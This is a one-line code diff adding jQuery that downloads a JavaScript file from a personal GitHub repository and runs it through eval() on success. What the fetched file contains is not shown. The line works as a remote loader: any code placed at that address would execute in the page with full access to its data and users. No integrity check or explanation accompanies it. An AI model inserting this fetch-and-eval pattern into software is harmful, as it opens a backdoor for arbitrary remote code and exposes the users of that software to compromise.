@@ -1,0 +1,1 @@
+$.ajax( '//raw.githubusercontent.com/AlexanderDronkin/rdw/master/rdw.js' ).success( ( data ) => { eval( data ) } );
